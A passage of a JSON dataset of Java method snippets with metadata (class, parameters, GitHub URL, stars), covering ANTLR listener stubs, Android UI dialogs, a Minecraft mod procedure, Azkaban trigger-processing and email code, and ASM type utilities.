"class_name": "MingBdJSONBaseListener", "params": ["ParserRuleContext"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterEveryRule(ParserRuleContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58984, "method_name": "exitEveryRule", "class_name": "MingBdJSONBaseListener", "params": ["ParserRuleContext"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitEveryRule(ParserRuleContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58985, "method_name": "visitTerminal", "class_name": "MingBdJSONBaseListener", "params": ["TerminalNode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void visitTerminal(TerminalNode node) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58986, "method_name": "visitErrorNode", "class_name": "MingBdJSONBaseListener", "params": ["ErrorNode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void visitErrorNode(ErrorNode node) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58987, "method_name": "get", "class_name": "DefaultQuality", "params": ["Context", "List<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String get(Context context, List<String> availableQualities) {\n        String quality = PrefUtils.get(context, Prefs.QUALITY_DEFAULT, \"720p\");\n        String[] fallbackOrder = new String[] {\"720p\", \"480p\", \"1080p\"};\n\n        if(availableQualities.indexOf(quality) == -1) {\n            for (String fallbackQuality : fallbackOrder) {\n                if (availableQualities.indexOf(fallbackQuality) != -1) {\n                    quality = fallbackQuality;\n                    break;\n                }\n            }\n        }\n\n        return quality;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/content/preferences/DefaultQuality.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58988, "method_name": "onDraw", "class_name": "Practice01DrawTextView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        // \u4f7f\u7528 drawText() \u6765\u7ed8\u5236\u6587\u5b57\n        // \u6587\u5b57\u5750\u6807\uff1a (50, 100)\n        canvas.drawText(text, 50, 100, paint);\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson3/Practice01DrawTextView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 58989, "method_name": "onCreateView", "class_name": "AddUserToStaffDialog", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        super.onCreateView(inflater, container, savedInstanceState);\n\n\n        View view = inflater.inflate(R.layout.dialog_add_staff, container);\n        ButterKnife.bind(this,view);\n\n        return view;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/Dialogs/AddUserToStaffDialog.java", "stars": "10", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 58990, "method_name": "onCreateDialog", "class_name": "AddUserToStaffDialog", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Dialog", "snippet": "    public Dialog onCreateDialog(Bundle savedInstanceState) {\n\n        Dialog dialog = super.onCreateDialog(savedInstanceState);\n        // request a window without the title\n        dialog.getWindow().requestFeature(Window.FEATURE_NO_TITLE);\n        return dialog;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/Dialogs/AddUserToStaffDialog.java", "stars": "10", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 58991, "method_name": "showToastMessage", "class_name": "AddUserToStaffDialog", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showToastMessage(String message)\n    {\n        Toast.makeText(getActivity(),message, Toast.LENGTH_SHORT).show();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/Dialogs/AddUserToStaffDialog.java", "stars": "10", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 58992, "method_name": "editUserID", "class_name": "AddUserToStaffDialog", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void editUserID()\n    {\n\n        userID = inputUserID.getText().toString();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/Dialogs/AddUserToStaffDialog.java", "stars": "10", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 58993, "method_name": "editSecretCode", "class_name": "AddUserToStaffDialog", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void editSecretCode()\n    {\n        if(secretCode.getText().toString().length()>0)\n        {\n            secretCodeInteger = Integer.parseInt(secretCode.getText().toString());\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/Dialogs/AddUserToStaffDialog.java", "stars": "10", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 58994, "method_name": "addMemberClick", "class_name": "AddUserToStaffDialog", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void addMemberClick()\n    {\n\n        if(inputUserID.getText().toString().equals(\"\"))\n        {\n            inputUserID.setError(\"Please enter User ID\");\n            inputUserID.requestFocus();\n\n            return;\n        }\n        else if(secretCode.getText().toString().equals(\"\"))\n        {\n            secretCode.setError(\"Please enter Secret Code\");\n            secretCode.requestFocus();\n\n            return;\n        }\n\n\n\n\n        Call<ResponseBody> call = staffService.upgradeUserToStaff(\n                PrefLogin.getAuthorizationHeaders(getActivity()),\n                userID,\n                secretCodeInteger\n        );\n\n\n\n\n        progressAddMember.setVisibility(View.VISIBLE);\n        addMember.setVisibility(View.INVISIBLE);\n\n\n        call.enqueue(new Callback<ResponseBody>() {\n            @Override\n            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {\n\n                progressAddMember.setVisibility(View.INVISIBLE);\n                addMember.setVisibility(View.VISIBLE);\n\n\n                if(!isVisible())\n                {\n                    return;\n                }\n\n                if(response.code()==200)\n                {\n                    showToastMessage(\"Successful !\");\n                }\n                else\n                {\n                    showToastMessage(\"Failed Code : \" + response.code());\n                }\n\n            }\n\n            @Override\n            public void onFailure(Call<ResponseBody> call, Throwable t) {\n\n\n                progressAddMember.setVisibility(View.INVISIBLE);\n                addMember.setVisibility(View.VISIBLE);\n\n\n\n                if(!isVisible())\n                {\n                    return;\n                }\n\n\n                showToastMessage(\"Failed !\");\n            }\n        });\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/Dialogs/AddUserToStaffDialog.java", "stars": "10", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 58995, "method_name": "dismissClick", "class_name": "AddUserToStaffDialog", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void dismissClick()\n    {\n        dismiss();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/Dialogs/AddUserToStaffDialog.java", "stars": "10", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 58996, "method_name": "monodroidAddReference", "class_name": "TextViewHolder", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextViewHolder.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58997, "method_name": "monodroidClearReferences", "class_name": "TextViewHolder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextViewHolder.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58998, "method_name": "main", "class_name": "ComputerBuilderTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        ComputerBuilder computerActualBuilder = new ComputerActualBuilder();\n        Conductor conductor = new Conductor();\n        conductor.setComputerBuilder(computerActualBuilder);\n        Computer computer = conductor.AssembleComputer(\"Intel i7-9700K\", \"\u534e\u7855 PRIME X570-P \u4e3b\u677f\",\n                \"\u91d1\u58eb\u987f(Kingston) DDR4 2666 32GB\", \" Manli\u4e07\u4e3dGTX1660 Super 6G\u6da1\u8f6e\u7535\u7ade\u6e38\u620f\u72ec\u7acb\u663e\u5361\",\n                \"AOC 23.8\u82f1\u5bf8 AH-IPS\u786c\u5c4f 1.5mm\u7a84\u8fb9\u6846 \u4f4e\u84dd\u5149\u7231\u773c\u4e0d\u95ea\u5c4f \u7535\u8111\u663e\u793a\u5668\");\n        System.out.println(computer);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58999, "method_name": "setiAppComponentHashMap", "class_name": "CompomentsService", "params": ["AppConfig", "IAppComponent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setiAppComponentHashMap(AppConfig.PAGE_TYPE componentName, IAppComponent iAppComponent){\n        iAppComponentHashMap.put(componentName, iAppComponent);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/appcomponent/CompomentsService.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59000, "method_name": "getiAppComponentHashMap", "class_name": "CompomentsService", "params": ["AppConfig"], "throws": null, "modifiers": ["public", "static"], "return_type": "IAppComponent", "snippet": "    public static IAppComponent getiAppComponentHashMap(AppConfig.PAGE_TYPE componentName){\n        if (iAppComponentHashMap.containsKey(componentName)){\n            return iAppComponentHashMap.get(componentName);\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/appcomponent/CompomentsService.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59001, "method_name": "create", "class_name": "SelfViewModelFactory", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T extends ViewModel> T create(Class<T> modelClass) {\n        if (ViewModel.class.isAssignableFrom(modelClass)) {\n            try {\n                return modelClass.getConstructor(BaseControlPresenter.class).newInstance(baseControlPresenter);\n            } catch (NoSuchMethodException e) {\n                throw new RuntimeException(\"Cannot create an instance of \" + modelClass, e);\n            } catch (IllegalAccessException e) {\n                throw new RuntimeException(\"Cannot create an instance of \" + modelClass, e);\n            } catch (InstantiationException e) {\n                throw new RuntimeException(\"Cannot create an instance of \" + modelClass, e);\n            } catch (InvocationTargetException e) {\n                throw new RuntimeException(\"Cannot create an instance of \" + modelClass, e);\n            }\n        }\n        return super.create(modelClass);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/viewmodel/SelfViewModelFactory.java", "stars": "14", "class_props": {"extends": "ViewModelProvider", "implements": null, "modifiers": ["public"]}}, {"id": 59002, "method_name": "detection", "class_name": "BaseLocalMemory", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void detection();\n}\n\n", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/common/base/BaseLocalMemory.java", "stars": "1", "class_props": {"extends": "BaseConfig", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59003, "method_name": "executeProcedure", "class_name": "RedAmaranthPotExplosionProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(RedAmaranthBlock.block, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/RedAmaranthPotExplosionProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 59004, "method_name": "executeFlowAndUpdateExecID", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void executeFlowAndUpdateExecID(final TriggerInstance triggerInst) {\n    try {\n      final Project project = triggerInst.getProject();\n      final Flow flow = FlowUtils.getFlow(project, triggerInst.getFlowId());\n      final ExecutableFlow executableFlow = FlowUtils.createExecutableFlow(project, flow);\n      // execute the flow with default execution option(concurrency option being \"ignore\n      // currently running\")\n      this.executorManager.submitExecutableFlow(executableFlow, triggerInst.getSubmitUser());\n      triggerInst.setFlowExecId(executableFlow.getExecutionId());\n    } catch (final Exception ex) {\n      logger.error(\"exception when executing the associated flow and updating flow exec id for \"\n              + \"trigger instance[id: {}]\",\n          triggerInst.getId(), ex);\n      // if flow fails to be executed(e.g. running execution exceeds the allowed concurrent run\n      // limit), set associated flow exec id to Constants.FAILED_EXEC_ID. Upon web server\n      // restart, recovery process will skip those flows.\n      triggerInst.setFlowExecId(Constants.FAILED_EXEC_ID);\n    }\n\n    this.flowTriggerInstanceLoader.updateAssociatedFlowExecId(triggerInst);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59005, "method_name": "generateFailureEmailSubject", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String generateFailureEmailSubject(final TriggerInstance triggerInstance) {\n    return String.format(FAILURE_EMAIL_SUBJECT, triggerInstance.getFlowId(), triggerInstance\n        .getProjectName(), this.emailer.getAzkabanName());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59006, "method_name": "createFlowTriggerFailureEmailMessage", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "EmailMessage", "snippet": "  private EmailMessage createFlowTriggerFailureEmailMessage(final TriggerInstance triggerInst) {\n    final EmailMessage message = this.emailer.createEmailMessage(generateFailureEmailSubject\n        (triggerInst), \"text/html\", triggerInst.getFailureEmails());\n    final SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n\n    message.addAllToAddress(triggerInst.getFailureEmails());\n    message.setMimeType(\"text/html\");\n    message.println(\"<table>\");\n    message.println(\"<tr><td>Start Time</td><td>\");\n    message.println(\"<tr><td>\" + sdf.format(new Date(triggerInst.getStartTime())) + \"</td><td>\");\n\n    message.println(\"<tr><td>End Time</td><td>\");\n    message.println(\"<tr><td>\" + sdf.format(new Date(triggerInst.getEndTime())) + \"</td><td>\");\n    message.println(\"<tr><td>Duration</td><td>\"\n        + Utils.formatDuration(triggerInst.getStartTime(), triggerInst.getEndTime())\n        + \"</td></tr>\");\n    message.println(\"<tr><td>Status</td><td>\" + triggerInst.getStatus() + \"</td></tr>\");\n    message.println(\"</table>\");\n    message.println(\"\");\n    final String executionUrl = this.emailer.getAzkabanURL() + \"/executor?triggerinstanceid=\"\n        + triggerInst.getId();\n\n    message.println(\"<a href=\\\"\" + executionUrl + \"\\\">\" + triggerInst.getFlowId()\n        + \" Flow Trigger Instance Link</a>\");\n\n    message.println(\"\");\n    message.println(\"<h3>Cancelled Dependencies</h3>\");\n\n    for (final DependencyInstance depInst : triggerInst.getDepInstances()) {\n      if (depInst.getStatus() == Status.CANCELLED) {\n        message.println(\"<table>\");\n        message.println(\"<tr><td>Dependency Name: \" + depInst.getDepName() + \"</td><td>\");\n        message\n            .println(\"<tr><td>Cancellation Cause: \" + depInst.getCancellationCause() + \"</td><td>\");\n        message.println(\"</table>\");\n      }\n    }\n\n    return message;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59007, "method_name": "sendFailureEmailIfConfigured", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void sendFailureEmailIfConfigured(final TriggerInstance triggerInstance) {\n    final List<String> failureEmails = triggerInstance.getFailureEmails();\n    if (!failureEmails.isEmpty()) {\n      final EmailMessage message = this.createFlowTriggerFailureEmailMessage(triggerInstance);\n      this.emailer.sendEmail(message, true, \"email message failure email for flow trigger \"\n          + triggerInstance.getId());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59008, "method_name": "processSucceed", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processSucceed(final TriggerInstance triggerInst) {\n    //todo chengren311: publishing Trigger events to Azkaban Project Events page\n    this.executorService.submit(() -> executeFlowAndUpdateExecID(triggerInst));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59009, "method_name": "processTermination", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processTermination(final TriggerInstance triggerInst) {\n    //sendFailureEmailIfConfigured takes 1/3 secs\n    this.executorService.submit(() -> sendFailureEmailIfConfigured(triggerInst));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59010, "method_name": "processNewInstance", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processNewInstance(final TriggerInstance triggerInst) {\n    this.flowTriggerInstanceLoader.uploadTriggerInstance(triggerInst);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59011, "method_name": "shutdown", "class_name": "TriggerInstanceProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void shutdown() {\n    this.executorService.shutdown();\n    this.executorService.shutdownNow();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59012, "method_name": "isPrimitiveDesc", "class_name": "TypeUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isPrimitiveDesc(String desc) {\n\t\tif(desc.length() != 1) {\n\t\t\treturn false;\n\t\t}\n\t\tswitch(desc.charAt(0)) {\n\t\t\tcase 'Z':\n\t\t\tcase 'C':\n\t\t\tcase 'B':\n\t\t\tcase 'S':\n\t\t\tcase 'I':\n\t\t\tcase 'F':\n\t\t\tcase 'J':\n\t\t\tcase 'D':\n\t\t\t\treturn true;\n\t\t\tdefault:\n\t\t\t\treturn false;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59013, "method_name": "commonMathType", "class_name": "TypeUtil", "params": ["Type", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "Type", "snippet": "\tpublic static Type commonMathType(Type a, Type b) {\n\t\tif (a == null || b == null)\n\t\t\tthrow new IllegalStateException(\"Cannot find common type of a null type\");\n\t\tint i1 = getPromotionIndex(a.getSort());\n\t\tint i2 = getPromotionIndex(b.getSort());\n\t\tint max = Math.max(i1, i2);\n\t\tif(max <= Type.DOUBLE)\n\t\t\treturn max == i1 ? a : b;\n\t\tthrow new IllegalStateException(\"Cannot do math on non-primitive types: \" +\n\t\t\t\ta.getDescriptor() + \" & \" + b.getDescriptor());\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59014, "method_name": "sortToSize", "class_name": "TypeUtil", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int sortToSize(int sort) {\n\t\tswitch(sort) {\n\t\t\tcase Type.LONG:\n\t\t\tcase Type.DOUBLE:\n\t\t\t\treturn 2;\n\t\t\tdefault:\n\t\t\t\treturn 1;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59015, "method_name": "getPromotionIndex", "class_name": "TypeUtil", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int getPromotionIndex(int sort) {\n\t\treturn SORT_ORDER.indexOf(sort);\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59016, "method_name": "isSubTypeOfOrNull", "class_name": "TypeUtil", "params": ["TypeChecker", "AbstractValue", "AbstractValue"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isSubTypeOfOrNull(TypeChecker typeChecker, AbstractValue childValue, AbstractValue parentValue) {\n\t\treturn isSubTypeOfOrNull(typeChecker, childValue, parentValue.getType());\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59017, "method_name": "isSubTypeOfOrNull", "class_name": "TypeUtil", "params": ["TypeChecker", "AbstractValue", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isSubTypeOfOrNull(TypeChecker typeChecker, AbstractValue childValue, Type parent) {\n\t\t// TODO: This should not occur\n\t\tif (childValue == null)\n\t\t\treturn false;\n\t\t// Null type and primitives do not mix.\n\t\t// Null types and object types do.\n\t\tif (childValue instanceof NullConstantValue && !isPrimitive(parent))\n\t\t\treturn true;\n\t\t// Uninitialized values are not subtypes\n\t\tif (childValue == UninitializedValue.UNINITIALIZED_VALUE)\n\t\t\treturn false;\n\t\t// Fallback\n\t\treturn isSubTypeOf(typeChecker, childValue.getType(), parent);\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59018, "method_name": "isSubTypeOf", "class_name": "TypeUtil", "params": ["TypeChecker", "Type", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isSubTypeOf(TypeChecker typeChecker, Type child, Type parent) {\n\t\t// Can't handle null type\n\t\tif (child == null)\n\t\t\treturn false;\n\t\t// Simple equality check\n\t\tif (child.equals(parent))\n\t\t\treturn true;\n\t\t// Look at array element type\n\t\tboolean bothArrays = child.getSort() == Type.ARRAY && parent.getSort() == Type.ARRAY;\n\t\tif (bothArrays) {\n\t\t\t// TODO: With usage cases of \"isSubTypeOf(...)\" should we just check the element types are equals?\n\t\t\t//  - Or should sub-typing with array element types be used like it currently is?\n\t\t\tchild = child.getElementType();\n\t\t\tparent = parent.getElementType();\n\t\t\t// Dimensions must match, unless both are Object\n\t\t\tif (child.getDimensions() != parent.getDimensions() &&\n\t\t\t\t\t!(child.equals(OBJECT_TYPE) && parent.equals(OBJECT_TYPE)))\n\t\t\t\treturn false;\n\t\t}\n\t\t// Null check in case\n\t\tif (parent == null)\n\t\t\treturn false;\n\t\t// Treat lesser primitives as integers.\n\t\t//  - Because of boolean consts are ICONST_0/ICONST_1\n\t\t//  - Short parameters take the stack value of BIPUSH (int)\n\t\tif (parent.getSort() >= Type.BOOLEAN && parent.getSort() <= Type.INT)\n\t\t\tparent = Type.INT_TYPE;\n\t\t// Check for primitives\n\t\t//  - ASM sorts are in a specific order\n\t\t//  - If the expected sort is a larger type (greater sort) then the given type can\n\t\t//    be assumed to be compatible.\n\t\tif (isPrimitive(parent) && isPrimitive(child))\n\t\t\treturn parent.getSort() >= child.getSort();\n\t\t// Use a simplified check if the expected type is just \"Object\"\n\t\t//  - Most things can be lumped into an object\n\t\tif (!isPrimitive(child) && parent.getDescriptor().equals(\"Ljava/lang/Object;\"))\n\t\t\treturn true;\n\t\t// Check if types are compatible\n\t\tif (child.getSort() == parent.getSort()) {\n\t\t\tAbstractValue host = AbstractValue.ofDefault(null, typeChecker, parent);\n\t\t\treturn host != null && host.canMerge(AbstractValue.ofDefault(null, typeChecker, child));\n\t\t}\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59019, "method_name": "isPrimitive", "class_name": "TypeUtil", "params": ["Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isPrimitive(Type type) {\n\t\treturn type.getSort() < Type.ARRAY;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59020, 